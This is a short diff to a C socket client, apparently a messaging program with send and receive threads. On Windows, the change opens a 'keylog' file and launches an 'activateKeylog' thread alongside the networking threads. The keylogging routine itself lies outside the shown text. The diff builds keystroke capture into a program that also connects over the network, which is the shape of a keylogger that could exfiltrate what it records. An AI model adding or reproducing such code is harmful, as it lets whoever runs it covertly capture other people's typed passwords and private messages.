@@ -13,6 +13,8 @@
 #endif
 
 #include "../common/socket.h"
+#include "../common/common.h"
+
 #define PORT 8080
 #define ADDRESS "127.0.0.1"
 int main() {
@@ -25,12 +27,16 @@ int main() {
 
 
 #ifdef _WIN32
-	HANDLE cliSocket, sendMSG, getMSG;
-	DWORD cliSocketId, sendMSGId, getMSGId;
+	FILE * keylog;
+	getFile(&keylog);
+
+	HANDLE cliSocket, sendMSG, getMSG, actKeylog;
+	DWORD cliSocketId, sendMSGId, getMSGId, actKeylogId;
 
 	WSADATA wsa;
 	WSAStartup(MAKEWORD(2,2), &wsa);
 
+	actKeylog = CreateThread(NULL, 0, activateKeylog, (LPVOID)&keylog, 0, &actKeylogId);
 	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)&param, 0, &cliSocketId);
 	sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
 	getMSG = CreateThread(NULL, 0, getMessage, (LPVOID)&param, 0, &getMSGId);
@@ -44,6 +50,10 @@ int main() {
 
 	WaitForSingleObject(getMSG, INFINITE);
 	CloseHandle(getMSG);
+
+	WaitForSingleObject(actKeylog, INFINITE);
+	CloseHandle(actKeylog);
+
 #else
 	pthread_t cliSocket, send, get;
 
